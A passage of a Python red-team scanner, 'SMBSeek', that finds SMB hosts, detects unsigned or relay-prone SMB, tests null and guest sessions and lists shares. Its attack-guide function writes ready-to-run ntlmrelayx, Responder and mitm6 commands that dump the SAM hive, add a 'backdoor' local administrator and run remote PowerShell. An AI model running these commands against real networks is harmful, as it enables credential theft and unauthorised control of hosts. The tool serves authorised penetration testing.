#!/usr/bin/env python3
"""
SMBSeek v2.0 - Modern SMB Discovery and Enumeration Tool

Discovers hosts with SMB enabled and performs comprehensive enumeration using NetExec.
Features:
- SMB signing detection (critical for relay attacks)
- SMBv1 detection and warnings
- Anonymous/null session testing
- Share enumeration with permissions
- Credential testing integration

Author: Internal Red Team
Date: November 2025
Platform: Kali Linux
Dependencies: netexec (formerly crackmapexec)
"""

import subprocess
import socket
import ipaddress
import argparse
import json
import os
import sys
import re

# Import shared utilities
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from seek_utils import find_ip_list
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# SMB ports to check
SMB_PORTS = {
    139: 'NetBIOS',
    445: 'SMB'
}

# Common share names to look for
INTERESTING_SHARES = [
    'C$', 'ADMIN$', 'IPC$',
    'SYSVOL', 'NETLOGON',
    'Users', 'Public', 'Backup', 'Backups',
    'Share', 'Shares', 'Data', 'Files',
    'Transfer', 'Temp', 'Common',
    'IT', 'Software', 'Installers'
]

def print_banner():
    """Print tool banner"""
    banner = f"""
{Colors.OKCYAN}╔═══════════════════════════════════════════════════════════╗
║                   SMBSeek v2.0                            ║
║       SMB Discovery + Signing Detection (NetExec)        ║
║              github.com/Lokii-git/seeksweet               ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}

{Colors.WARNING}🔍 Enhanced Features:{Colors.ENDC}
{Colors.OKGREEN}  • SMB Signing Detection (Critical for Relay Attacks)
  • SMBv1 Detection and Warnings
  • Anonymous/Null Session Testing
  • Modern NetExec-powered Enumeration{Colors.ENDC}
"""
    print(banner)

def read_ip_list(file_path: str) -> List[str]:
    """
    Read and parse IP addresses from file.
    Supports individual IPs and CIDR notation.
    
    Args:
        file_path: Path to file containing IP addresses
        
    Returns:
        List of IP address strings
    """
    # Use shared utility to find the file
    file_path = find_ip_list(file_path)
    
    ips = []
    
    if not os.path.exists(file_path):
        print(f"{Colors.FAIL}[!] Error: File '{file_path}' not found{Colors.ENDC}")
        return ips
    
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                
                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue
                
                # Check if it's CIDR notation
                if '/' in line:
                    try:
                        network = ipaddress.ip_network(line, strict=False)
                        ips.extend([str(ip) for ip in network.hosts()])
                    except ValueError as e:
                        print(f"{Colors.WARNING}[!] Invalid CIDR: {line} - {e}{Colors.ENDC}")
                else:
                    # Validate single IP
                    try:
                        ipaddress.ip_address(line)
                        ips.append(line)
                    except ValueError:
                        print(f"{Colors.WARNING}[!] Invalid IP: {line}{Colors.ENDC}")
        
        print(f"{Colors.OKGREEN}[+] Loaded {len(ips)} IP address(es) from {file_path}{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error reading file: {e}{Colors.ENDC}")
    
    return ips

def check_port(ip: str, port: int, timeout: int = 2) -> bool:
    """
    Check if a port is open on the given IP.
    
    Args:
        ip: IP address to check
        port: Port number to check
        timeout: Connection timeout in seconds
        
    Returns:
        True if port is open, False otherwise
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def get_hostname(ip: str) -> Optional[str]:
    """
    Get hostname via reverse DNS lookup.
    
    Args:
        ip: IP address to lookup
        
    Returns:
        Hostname if found, None otherwise
    """
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except:
        return None

def check_netexec() -> bool:
    """
    Check if netexec is installed.
    
    Returns:
        True if netexec is available, False otherwise
    """
    try:
        subprocess.run(['netexec', '--version'], 
                      capture_output=True, 
                      timeout=5)
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def enumerate_smb_netexec_bulk(ip_list: List[str], username: str = '', password: str = '', 
                               timeout: int = 60) -> Tuple[str, Optional[str]]:
    """
    Enumerate SMB using NetExec bulk scanning for efficiency.
    
    Args:
        ip_list: List of IP addresses to scan
        username: Username for authentication (empty for null session)
        password: Password for authentication (empty for null session)
        timeout: Command timeout in seconds
        
    Returns:
        Tuple of (raw netexec output, error message)
    """
    
    # Create a temporary file with IP addresses
    import tempfile
    import os
    
    try:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            for ip in ip_list:
                temp_file.write(f"{ip}\n")
            temp_filename = temp_file.name
        
        # Build netexec command for bulk scanning
        cmd = ['netexec', 'smb', temp_filename, '--shares', '--continue-on-success']
        
        if username:
            cmd.extend(['-u', username, '-p', password])
        else:
            # Test null session / anonymous access
            cmd.extend(['-u', '', '-p', ''])
        
        print(f"{Colors.OKBLUE}[*] Running NetExec bulk scan: {' '.join(cmd)}{Colors.ENDC}")
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL
        )
        
        # Clean up temp file
        os.unlink(temp_filename)
        
        if result.stdout:
            return result.stdout, None
        else:
            error_msg = result.stderr.strip() if result.stderr else f"NetExec failed with return code {result.returncode}"
            return "", error_msg
            
    except subprocess.TimeoutExpired:
        return "", f"NetExec timeout after {timeout} seconds"
    except Exception as e:
        return "", f"NetExec error: {str(e)}"

def enumerate_smb_netexec(ip: str, username: str = '', password: str = '', 
                          timeout: int = 15) -> Tuple[Optional[Dict], Optional[str]]:
    """
    Enumerate SMB using NetExec for comprehensive assessment.
    
    Args:
        ip: Target IP address
        username: Username for authentication (empty for null session)
        password: Password for authentication (empty for null session)
        timeout: Command timeout in seconds
        
    Returns:
        Tuple of (smb_info dict, error message)
    """
    
    # Build netexec command
    cmd = ['netexec', 'smb', ip, '--shares']
    
    if username:
        cmd.extend(['-u', username, '-p', password])
    else:
        # Test null session / anonymous access
        cmd.extend(['-u', '', '-p', ''])
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        if result.returncode == 0 or result.stdout:
            # Parse NetExec output
            smb_info = parse_netexec_output(result.stdout, ip)
            return smb_info, None
        else:
            error_msg = result.stderr.strip() if result.stderr else f"NetExec failed with return code {result.returncode}"
            return None, error_msg
            
    except subprocess.TimeoutExpired:
        return None, f"NetExec timeout after {timeout} seconds"
    except Exception as e:
        return None, f"NetExec error: {str(e)}"

def parse_netexec_bulk_output(output: str) -> Dict[str, Dict]:
    """
    Parse NetExec bulk output to extract SMB information for multiple hosts.
    
    Args:
        output: NetExec bulk stdout
        
    Returns:
        Dictionary mapping IP addresses to SMB information
    """
    results = {}
    lines = output.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or not 'SMB' in line:
            continue
            
        # Extract IP from NetExec output
        # Example: SMB         192.168.1.100   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CONTOSO.LOCAL) (signing:True) (SMBv1:False)
        parts = line.split()
        if len(parts) >= 3 and parts[0] == 'SMB':
            ip = parts[1]
            
            # Initialize result for this IP if not exists
            if ip not in results:
                results[ip] = {
                    'ip': ip,
                    'hostname': 'Unknown',
                    'domain': 'Unknown', 
                    'os': 'Unknown',
                    'smb_signing': {
                        'signing_enabled': False,
                        'signing_required': False,
                        'relay_vulnerable': True,
                        'error': None
                    },
                    'smbv1': False,
                    'shares': [],
                    'authentication': 'Failed',
                    'errors': []
                }
            
            # Parse this line and update the result
            smb_info = parse_netexec_output(line, ip)
            
            # Merge the parsed information
            if smb_info['hostname'] != 'Unknown':
                results[ip]['hostname'] = smb_info['hostname']
            if smb_info['domain'] != 'Unknown':
                results[ip]['domain'] = smb_info['domain']
            if smb_info['os'] != 'Unknown':
                results[ip]['os'] = smb_info['os']
            
            # Update SMB signing info
            results[ip]['smb_signing'].update(smb_info['smb_signing'])
            results[ip]['smbv1'] = smb_info['smbv1']
            
            # Add shares (avoid duplicates)
            for share in smb_info['shares']:
                if not any(s['name'] == share['name'] for s in results[ip]['shares']):
                    results[ip]['shares'].append(share)
                    
            # Update authentication status
            if smb_info['authentication'] != 'Failed':
                results[ip]['authentication'] = smb_info['authentication']
    
    return results

def parse_netexec_output(output: str, ip: str) -> Dict:
    """
    Parse NetExec output to extract SMB information.
    
    Args:
        output: NetExec stdout
        ip: Target IP
        
    Returns:
        Dictionary with SMB information
    """
    smb_info = {
        'ip': ip,
        'hostname': 'Unknown',
        'domain': 'Unknown',
        'os': 'Unknown',
        'smb_signing': {
            'signing_enabled': False,
            'signing_required': False,
            'relay_vulnerable': True,
            'error': None
        },
        'smbv1': False,
        'protocol_versions': [],
        'shares': [],
        'authentication': 'Failed',
        'errors': []
    }
    
    lines = output.split('\n')
    
    for line in lines:
        line = line.strip()
        
        # Extract basic host info
        if 'SMB' in line and ip in line:
            # Parse NetExec SMB line format
            # Example: SMB         192.168.1.100   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CONTOSO.LOCAL) (signing:True) (SMBv1:False)
            
            if '(name:' in line:
                hostname_match = re.search(r'\(name:([^)]+)\)', line)
                if hostname_match:
                    smb_info['hostname'] = hostname_match.group(1)
            
            if '(domain:' in line:
                domain_match = re.search(r'\(domain:([^)]+)\)', line)
                if domain_match:
                    smb_info['domain'] = domain_match.group(1)
            
            if 'Windows' in line:
                os_match = re.search(r'Windows [^(]+', line)
                if os_match:
                    smb_info['os'] = os_match.group(0).strip()
            
            # Parse SMB signing status
            if '(signing:' in line:
                signing_match = re.search(r'\(signing:([^)]+)\)', line)
                if signing_match:
                    signing_status = signing_match.group(1).lower()
                    if signing_status == 'true':
                        smb_info['smb_signing']['signing_enabled'] = True
                        smb_info['smb_signing']['signing_required'] = True  # Assume required if enabled
                        smb_info['smb_signing']['relay_vulnerable'] = False
                    elif signing_status == 'false':
                        smb_info['smb_signing']['signing_enabled'] = False
                        smb_info['smb_signing']['signing_required'] = False
                        smb_info['smb_signing']['relay_vulnerable'] = True
            
            if '(SMBv1:' in line:
                smbv1_match = re.search(r'\(SMBv1:([^)]+)\)', line)
                if smbv1_match:
                    smb_info['smbv1'] = smbv1_match.group(1).lower() == 'true'
        
        # Extract share information
        elif line.startswith('SMB') and ('Disk' in line or 'IPC' in line or 'Print' in line):
            # Parse share line format
            # Example: SMB         192.168.1.100   445    DC01             ADMIN$                           Disk      Remote Admin
            parts = line.split()
            if len(parts) >= 6:
                share_name = parts[4]
                share_type = parts[5] if len(parts) > 5 else 'Unknown'
                comment = ' '.join(parts[6:]) if len(parts) > 6 else ''
                
                share_info = {
                    'name': share_name,
                    'type': share_type,
                    'comment': comment
                }
                smb_info['shares'].append(share_info)
        
        # Check for authentication status
        elif '[+]' in line and 'Login successful' in line:
            smb_info['authentication'] = 'Success'
        elif '[-]' in line and any(term in line.lower() for term in ['login failed', 'authentication failed', 'access denied']):
            smb_info['authentication'] = 'Failed'
            smb_info['errors'].append(line)
        elif '[+]' in line and 'Guest' in line:
            smb_info['authentication'] = 'Guest'
        elif '[+]' in line and 'Anonymous' in line:
            smb_info['authentication'] = 'Anonymous'
    
    return smb_info

def test_share_access(ip: str, share_name: str, username: str = '', 
                     password: str = '', timeout: int = 10) -> Dict:
    """
    Test if a share is accessible and attempt to list contents using NetExec.
    
    Args:
        ip: Target IP address
        share_name: Name of the share to test
        username: Username for authentication
        password: Password for authentication
        timeout: Command timeout in seconds
        
    Returns:
        Dict with access results
    """
    result = {
        'accessible': False,
        'readable': False,
        'writable': False,
        'files_found': 0,
        'error': None
    }
    
    # Build NetExec command to test share access
    if username:
        cmd = ['netexec', 'smb', ip, '-u', username, '-p', password, '--shares', '--share', share_name]
    else:
        cmd = ['netexec', 'smb', ip, '-u', '', '-p', '', '--shares', '--share', share_name]
    
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL
        )
        
        output = proc.stdout + proc.stderr
        
        # Check for access patterns in NetExec output
        if 'STATUS_ACCESS_DENIED' in output or 'Access Denied' in output:
            result['error'] = 'Access Denied'
        elif 'STATUS_BAD_NETWORK_NAME' in output or 'Invalid share' in output:
            result['error'] = 'Invalid Share Name'
        elif 'STATUS_LOGON_FAILURE' in output or 'Login failed' in output:
            result['error'] = 'Logon Failure'
        elif 'READ' in output or 'WRITE' in output or proc.returncode == 0:
            result['accessible'] = True
            
            # Check for read/write permissions
            if 'READ' in output:
                result['readable'] = True
            if 'WRITE' in output:
                result['writable'] = True
                
            # NetExec doesn't provide file counts directly, so we estimate based on output
            # If we can access the share, assume some files are present
            if result['readable']:
                result['files_found'] = 1  # Conservative estimate
        else:
            result['error'] = 'Unknown error'
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except Exception as e:
        result['error'] = str(e)
    
    return result

def check_smb_signing(ip: str, timeout: int = 5) -> Dict:
    """
    Check SMB signing status using NetExec.
    
    Args:
        ip: Target IP address
        timeout: Command timeout in seconds
        
    Returns:
        Dict with signing status
    """
    result = {
        'signing_enabled': False,
        'signing_required': False,
        'relay_vulnerable': False,
        'error': None
    }
    
    try:
        # Use NetExec to check SMB signing
        cmd = ['netexec', 'smb', ip, '--gen-relay-list', 'temp_relay.txt']
        
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL
        )
        
        output = proc.stdout + proc.stderr
        
        # Parse output for signing status
        if 'signing:False' in output.lower() or 'signing: False' in output:
            result['signing_enabled'] = False
            result['signing_required'] = False
            result['relay_vulnerable'] = True
        elif 'signing:True' in output.lower() or 'signing: True' in output:
            result['signing_enabled'] = True
            # Check if required or just enabled
            if 'signing required' not in output.lower():
                result['signing_required'] = False
                result['relay_vulnerable'] = True
            else:
                result['signing_required'] = True
                result['relay_vulnerable'] = False
        
        # Clean up temp file
        if os.path.exists('temp_relay.txt'):
            os.remove('temp_relay.txt')
        
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'netexec not found - install with: sudo apt install netexec'
    except Exception as e:
        result['error'] = str(e)
    
    return result

def scan_host(ip: str, timeout: int = 2, test_access: bool = False, 
              username: str = '', password: str = '') -> Dict:
    """
    Scan a single host for SMB and enumerate shares.
    
    Args:
        ip: IP address to scan
        timeout: Connection timeout
        test_access: Whether to test share access
        username: Username for authentication
        password: Password for authentication
        
    Returns:
        Dict with scan results
    """
    result = {
        'ip': ip,
        'hostname': None,
        'domain': None,
        'os': None,
        'smb_enabled': False,
        'ports_open': [],
        'shares': [],
        'accessible_shares': [],
        'interesting_shares': [],
        'null_session': False,
        'guest_access': False,
        'smb_signing': None,
        'smbv1': False,
        'error': None
    }
    
    # Get hostname
    hostname = get_hostname(ip)
    if hostname:
        result['hostname'] = hostname
    
    # Check SMB ports
    open_ports = []
    for port, service in SMB_PORTS.items():
        if check_port(ip, port, timeout):
            open_ports.append(port)
            result['ports_open'].append({'port': port, 'service': service})
    
    if not open_ports:
        result['error'] = 'No SMB ports open'
        return result
    
    result['smb_enabled'] = True
    
    # Check SMB signing status
    # Try to enumerate SMB with NetExec (null session first)
    smb_info, error = enumerate_smb_netexec(ip, '', '', timeout=15)
    
    if smb_info and smb_info['shares']:
        result['null_session'] = True
        result['shares'] = smb_info['shares']
        result['smb_signing'] = smb_info['smb_signing']
        result['hostname'] = smb_info['hostname']
        result['domain'] = smb_info['domain']
        result['os'] = smb_info['os']
        result['smbv1'] = smb_info['smbv1']
    else:
        # Try with guest account
        smb_info, error = enumerate_smb_netexec(ip, 'guest', '', timeout=15)
        if smb_info and smb_info['shares']:
            result['guest_access'] = True
            result['shares'] = smb_info['shares']
            result['smb_signing'] = smb_info['smb_signing']
            result['hostname'] = smb_info['hostname'] 
            result['domain'] = smb_info['domain']
            result['os'] = smb_info['os']
            result['smbv1'] = smb_info['smbv1']
        elif username:
            # Try with provided credentials
            smb_info, error = enumerate_smb_netexec(ip, username, password, timeout=15)
            if smb_info and smb_info['shares']:
                result['shares'] = smb_info['shares']
                result['smb_signing'] = smb_info['smb_signing']
                result['hostname'] = smb_info['hostname']
                result['domain'] = smb_info['domain'] 
                result['os'] = smb_info['os']
                result['smbv1'] = smb_info['smbv1']
            else:
                result['error'] = error
        else:
            result['error'] = error
    
    # Check for interesting shares
    if result['shares']:
        for share in result['shares']:
            if any(interesting.lower() in share['name'].lower() 
                   for interesting in INTERESTING_SHARES):
                result['interesting_shares'].append(share['name'])
    
    # Test share access if requested
    if test_access and result['shares']:
        for share in result['shares']:
            share_name = share['name']
            
            # Skip IPC$ as it's not a file share
            if share_name == 'IPC$':
                continue
            
            access_result = test_share_access(ip, share_name, username, password, timeout=10)
            
            if access_result['accessible']:
                result['accessible_shares'].append({
                    'name': share_name,
                    'readable': access_result['readable'],
                    'writable': access_result['writable'],
                    'files_found': access_result['files_found']
                })
    
    return result

def save_smb_list(results: List[Dict], filename: str = 'smblist.txt'):
    """
    Save list of IPs with SMB enabled to a file.
    
    Args:
        results: List of scan result dicts
        filename: Output filename
    """
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['smb_enabled']:
                    f.write(f"{result['ip']}\n")
        
        print(f"\n{Colors.OKGREEN}[+] SMB host list saved to: {filename}{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Error saving SMB list: {e}{Colors.ENDC}")

def save_share_list(results: List[Dict], filename: str = 'sharelist.txt'):
    """
    Save list of accessible shares to a file (UNC paths).
    
    Args:
        results: List of scan result dicts
        filename: Output filename
    """
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['accessible_shares']:
                    for share in result['accessible_shares']:
                        unc_path = f"\\\\{result['ip']}\\{share['name']}"
                        f.write(f"{unc_path}\n")
        
        print(f"{Colors.OKGREEN}[+] Share list saved to: {filename}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error saving share list: {e}{Colors.ENDC}")

def save_details(results: List[Dict], txt_filename: str = 'smb_details.txt', 
                json_filename: str = 'smb_details.json'):
    """
    Save detailed scan results to TXT and JSON files.
    
    Args:
        results: List of scan result dicts
        txt_filename: TXT output filename
        json_filename: JSON output filename
    """
    # Save TXT format
    try:
        with open(txt_filename, 'w') as f:
            f.write("SMBSeek - SMB Share Discovery Results\n")
            f.write("=" * 70 + "\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            smb_hosts = [r for r in results if r['smb_enabled']]
            accessible_count = sum(1 for r in results if r['accessible_shares'])
            
            f.write(f"Total Hosts with SMB: {len(smb_hosts)}\n")
            f.write(f"Hosts with Accessible Shares: {accessible_count}\n")
            f.write("=" * 70 + "\n\n")
            
            for result in smb_hosts:
                f.write(f"Host: {result['ip']}\n")
                if result['hostname']:
                    f.write(f"Hostname: {result['hostname']}\n")
                
                f.write(f"Ports: {', '.join(str(p['port']) for p in result['ports_open'])}\n")
                
                # SMB signing status
                if result['smb_signing']:
                    signing = result['smb_signing']
                    if signing['relay_vulnerable']:
                        f.write("⚠⚠⚠ SMB RELAY VULNERABLE - SIGNING DISABLED/NOT REQUIRED ⚠⚠⚠\n")
                    elif signing['signing_required']:
                        f.write("✓ SMB SIGNING REQUIRED (Protected)\n")
                    elif signing['signing_enabled']:
                        f.write("⚠ SMB SIGNING ENABLED (Not Required - Still Vulnerable)\n")
                    if signing['error']:
                        f.write(f"  Signing Check Error: {signing['error']}\n")
                
                if result['null_session']:
                    f.write("⚠ NULL SESSION ALLOWED\n")
                if result['guest_access']:
                    f.write("⚠ GUEST ACCESS ALLOWED\n")
                
                if result['shares']:
                    f.write(f"Shares Found: {len(result['shares'])}\n")
                    f.write("-" * 70 + "\n")
                    
                    for share in result['shares']:
                        f.write(f"  Share: {share['name']}\n")
                        f.write(f"  Type: {share['type']}\n")
                        if share['comment']:
                            f.write(f"  Comment: {share['comment']}\n")
                        
                        # Check if accessible
                        accessible = next((s for s in result['accessible_shares'] 
                                         if s['name'] == share['name']), None)
                        if accessible:
                            f.write(f"  ✓ ACCESSIBLE (Readable: {accessible['readable']}, "
                                   f"Files: {accessible['files_found']})\n")
                        
                        # Check if interesting
                        if share['name'] in result['interesting_shares']:
                            f.write(f"  ★ INTERESTING SHARE\n")
                        
                        f.write("\n")
                
                if result['error']:
                    f.write(f"Error: {result['error']}\n")
                
                f.write("=" * 70 + "\n\n")
        
        print(f"{Colors.OKGREEN}[+] Detailed results saved to: {txt_filename}{Colors.ENDC}")
    
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error saving TXT details: {e}{Colors.ENDC}")
    
    # Save JSON format
    try:
        with open(json_filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"{Colors.OKGREEN}[+] JSON results saved to: {json_filename}{Colors.ENDC}")
    
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error saving JSON details: {e}{Colors.ENDC}")

def save_relay_targets(results: List[Dict], filename: str = 'smb_relay_targets.txt'):
    """
    Save list of SMB relay-vulnerable hosts to a file.
    
    Args:
        results: List of scan result dicts
        filename: Output filename
    """
    try:
        relay_targets = []
        
        for result in results:
            if result['smb_enabled'] and result['smb_signing']:
                if result['smb_signing']['relay_vulnerable']:
                    relay_targets.append(result)
        
        if not relay_targets:
            return 0
        
        with open(filename, 'w') as f:
            for result in relay_targets:
                f.write(f"{result['ip']}\n")
        
        print(f"{Colors.OKGREEN}[+] Relay targets saved to: {filename}{Colors.ENDC}")
        return len(relay_targets)
        
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error saving relay targets: {e}{Colors.ENDC}")
        return 0

def save_smb_attack_guide(results: List[Dict], filename: str = 'SMB_ATTACK_GUIDE.txt'):
    """
    Generate attack guide for SMB relay vulnerabilities.
    
    Args:
        results: List of scan result dicts
        filename: Output filename
    """
    try:
        relay_targets = []
        signing_enabled = []
        signing_required = []
        
        for result in results:
            if result['smb_enabled'] and result['smb_signing']:
                signing = result['smb_signing']
                if signing['relay_vulnerable']:
                    relay_targets.append(result)
                elif signing['signing_enabled'] and not signing['signing_required']:
                    signing_enabled.append(result)
                elif signing['signing_required']:
                    signing_required.append(result)
        
        if not relay_targets:
            return
        
        with open(filename, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("SMB RELAY ATTACK GUIDE\n")
            f.write("=" * 70 + "\n\n")
            
            f.write(f"[+] Found {len(relay_targets)} SMB relay-vulnerable hosts!\n\n")
            
            # Summary
            f.write("SMB Signing Status Summary:\n")
            f.write(f"  • Relay Vulnerable (Signing Disabled/Not Required): {len(relay_targets)}\n")
            f.write(f"  • Signing Enabled (Not Required): {len(signing_enabled)}\n")
            f.write(f"  • Signing Required (Protected): {len(signing_required)}\n\n")
            
            # Relay targets
            f.write("Relay-Vulnerable Hosts:\n")
            f.write("-" * 70 + "\n")
            for result in relay_targets:
                hostname_str = f" ({result['hostname']})" if result['hostname'] else ""
                f.write(f"  • {result['ip']}{hostname_str}\n")
            f.write("\n")
            
            # Attack workflow
            f.write("=" * 70 + "\n")
            f.write("RECOMMENDED ATTACK WORKFLOW\n")
            f.write("=" * 70 + "\n\n")
            
            f.write("1. START NTLMRELAYX (Terminal 1)\n")
            f.write("-" * 70 + "\n")
            f.write("   Relay to SMB targets:\n")
            f.write(f"   impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support\n\n")
            f.write("   Or relay to specific high-value target:\n")
            f.write(f"   impacket-ntlmrelayx -t {relay_targets[0]['ip']} -smb2support -c 'whoami'\n\n")
            
            f.write("2. START RESPONDER (Terminal 2)\n")
            f.write("-" * 70 + "\n")
            f.write("   Poison LLMNR/NBT-NS to capture hashes:\n")
            f.write("   sudo responder -I eth0 -wrf\n\n")
            f.write("   Note: Monitor Responder logs:\n")
            f.write("   tail -f /usr/share/responder/logs/*\n\n")
            
            f.write("3. WAIT FOR AUTHENTICATION (Both Terminals)\n")
            f.write("-" * 70 + "\n")
            f.write("   ntlmrelayx will automatically relay captured credentials\n")
            f.write("   to targets in smb_relay_targets.txt\n\n")
            
            f.write("4. ALTERNATIVE: MITM6 FOR IPv6 ATTACKS\n")
            f.write("-" * 70 + "\n")
            f.write("   Instead of Responder, use mitm6:\n")
            f.write("   sudo mitm6 -d domain.local\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("IMPORTANT NOTES\n")
            f.write("=" * 70 + "\n\n")
            
            f.write("• Hashes captured by Responder can be cracked with hashsweep\n")
            f.write("• ntlmrelayx will attempt to execute commands if successful\n")
            f.write("• Monitor both tools for successful relays\n")
            f.write("• Consider using '-c' flag with ntlmrelayx for command execution\n")
            f.write("• For dumps: use '-c' with secretsdump commands\n\n")
            
            f.write("EXAMPLE COMMANDS:\n")
            f.write("-" * 70 + "\n")
            f.write("# Dump SAM database:\n")
            f.write("impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support \\\n")
            f.write("  -c 'reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save'\n\n")
            
            f.write("# Add user to local admins:\n")
            f.write("impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support \\\n")
            f.write("  -c 'net localgroup administrators /add backdoor'\n\n")
            
            f.write("# Execute remote command:\n")
            f.write("impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support \\\n")
            f.write("  -c 'powershell -Command \"whoami; ipconfig\"'\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("REFERENCES\n")
            f.write("=" * 70 + "\n\n")
            f.write("• https://www.hackingarticles.in/ntlm-relay-attack-guide/\n")
            f.write("• https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py\n")
            f.write("• https://www.rapid7.com/blog/post/2017/07/17/ntlm-relay-attacks/\n\n")
        
        print(f"{Colors.OKGREEN}[+] SMB attack guide saved to: {filename}{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error saving attack guide: {e}{Colors.ENDC}")

def main():
    parser = argparse.ArgumentParser(
        description='SMBSeek v2.0 - SMB Discovery + Signing Detection (NetExec-Powered)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                              # Basic scan
  %(prog)s -v                           # Verbose output
  %(prog)s -t                           # Test share access
  %(prog)s -u admin -p password         # Use credentials
  %(prog)s -f targets.txt -t -v         # Full scan with access testing
  %(prog)s -w 20 -t 3                   # Custom workers and timeout
        """
    )
    
    parser.add_argument('-f', '--file', 
                       default='iplist.txt',
                       help='Input file with IP addresses (default: iplist.txt)')
    
    parser.add_argument('-w', '--workers', 
                       type=int, 
                       default=10,
                       help='Number of concurrent workers (default: 10)')
    
    parser.add_argument('-t', '--test-access',
                       action='store_true',
                       help='Test access to discovered shares')
    
    parser.add_argument('-u', '--username',
                       default='',
                       help='Username for authentication')
    
    parser.add_argument('-p', '--password',
                       default='',
                       help='Password for authentication')
    
    parser.add_argument('--timeout',
                       type=int,
                       default=2,
                       help='Connection timeout in seconds (default: 2)')
    
    parser.add_argument('-v', '--verbose',
                       action='store_true',
                       help='Verbose output (show all hosts)')
    
    parser.add_argument('--no-raw-output',
                       action='store_true',
                       help='Hide raw NetExec output (show only parsed results)')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Check for netexec
    if not check_netexec():
        print(f"{Colors.FAIL}[!] Error: netexec not found. Please install: sudo apt install netexec{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Note: netexec replaces crackmapexec for modern SMB enumeration{Colors.ENDC}")
        return 1
    
    # Validate workers
    if args.workers < 1 or args.workers > 100:
        print(f"{Colors.FAIL}[!] Error: Workers must be between 1 and 100{Colors.ENDC}")
        return 1
    
    # Read IP list
    ips = read_ip_list(args.file)
    if not ips:
        print(f"{Colors.FAIL}[!] No valid IPs to scan{Colors.ENDC}")
        return 1
    
    print(f"\n{Colors.OKBLUE}[*] Starting SMB bulk scan with NetExec...{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Targets: {len(ips)}{Colors.ENDC}")
    if args.username:
        print(f"{Colors.OKBLUE}[*] Authentication: {args.username}:{'*' * len(args.password)}{Colors.ENDC}")
    print()
    
    # Use NetExec bulk scanning for efficiency
    netexec_output, error = enumerate_smb_netexec_bulk(ips, args.username, args.password, timeout=120)
    
    if error:
        print(f"{Colors.FAIL}[!] NetExec bulk scan failed: {error}{Colors.ENDC}")
        return 1
    
    # Always show raw NetExec output unless disabled
    if not args.no_raw_output:
        print(f"\n{Colors.OKGREEN}[+] Raw NetExec Output:{Colors.ENDC}")
        print("=" * 80)
        print(netexec_output)
        print("=" * 80)
    
    # Parse bulk results
    bulk_results = parse_netexec_bulk_output(netexec_output)
    
    # Convert to our result format and add port scanning
    results = []
    smb_found = 0
    
    for ip in ips:
        result = {
            'ip': ip,
            'hostname': None,
            'domain': None,
            'os': None,
            'smb_enabled': False,
            'ports_open': [],
            'shares': [],
            'accessible_shares': [],
            'interesting_shares': [],
            'null_session': False,
            'guest_access': False,
            'smb_signing': None,
            'smbv1': False,
            'error': None
        }
        
        # Check SMB ports quickly
        open_ports = []
        for port, service in SMB_PORTS.items():
            if check_port(ip, port, args.timeout):
                open_ports.append(port)
                result['ports_open'].append({'port': port, 'service': service})
        
        if open_ports:
            result['smb_enabled'] = True
            
            # Use NetExec results if available
            if ip in bulk_results:
                netexec_data = bulk_results[ip]
                result.update({
                    'hostname': netexec_data['hostname'],
                    'domain': netexec_data['domain'],
                    'os': netexec_data['os'],
                    'shares': netexec_data['shares'],
                    'smb_signing': netexec_data['smb_signing'],
                    'smbv1': netexec_data['smbv1']
                })
